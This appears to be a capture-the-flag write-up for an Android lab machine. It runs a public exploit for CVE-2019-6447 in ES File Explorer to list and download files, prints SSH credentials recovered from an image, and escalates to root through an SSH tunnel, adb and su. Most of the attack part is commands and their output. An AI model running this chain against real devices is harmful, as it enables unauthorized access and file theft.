# Explore

- Target Machine: 10.10.10.247

## Enumeration

### nmap scan

```bash
# Nmap 7.92 scan initiated Tue Sep  7 17:57:42 2021 as: nmap -sC -sV -p- -vv -oN nmap/all_ports.log 10.10.10.247
Nmap scan report for 10.10.10.247
Host is up, received conn-refused (0.051s latency).
Scanned at 2021-09-07 17:57:57 CEST for 128s
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
2222/tcp  open     ssh     syn-ack     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2urk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL
5555/tcp  filtered freeciv no-response
35329/tcp open     unknown syn-ack
| fingerprint-strings: 
|   GenericLines: 
|       .
|       .
|       .
42135/tcp open     http    syn-ack     ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    syn-ack     Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

### Exploit DB research

- Found vulnerability + script: https://www.exploit-db.com/exploits/50070

- Running the exploit:

```
[exyss@exyss Explore]$ python scripts/explorer_exploit.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)

[exyss@exyss Explore]$ python scripts/explorer_exploit.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg                        

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

[exyss@exyss Explore]$ mv out.dat creds.jpg
```

- Credentials found in the picture:
    - kristi
    - Kr1sT!5h@Rp3xPl0r3!

## Accessing the machine

We can use these credentials to access the machine through the SSH server hosted on port 2222 using `ssh kristi@10.10.10.247 -p 2222`

The user flag is in the sdcard directory

## Priviledge escalation

In order to easily get root access on an android device, we can use the Android Debug Bridge (ABD).
First, we have to create an SSH tunnel across our machine's 5555 port and the target machine's 5555 port by running `ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222`.
Now we can connect to the target machine with adb passing through our own 5555 port: 

```bash
[exyss@exyss Explore]$ cd andoid-sdk/platform-tools

[exyss@exyss platform-tools]$ ./adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555

[exyss@exyss platform-tools]$ adb shell
bash: adb: command not found

[exyss@exyss platform-tools]$ ./adb shell
adb: more than one device/emulator

[exyss@exyss platform-tools]$ ./adb list devices
adb: unknown command list

[exyss@exyss platform-tools]$ ./adb devices
List of devices attached
emulator-5554   device
localhost:5555  device

[exyss@exyss platform-tools]$ ./adb -s localhost:5555 shell

x86_64:/ $ cd data

x86_64:/data $ ls
ls: .: Permission denied

1|x86_64:/data $ su

:/ $ cd data

:/data $ ls
adb           bootchart     media       property       tombstones 
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de     
```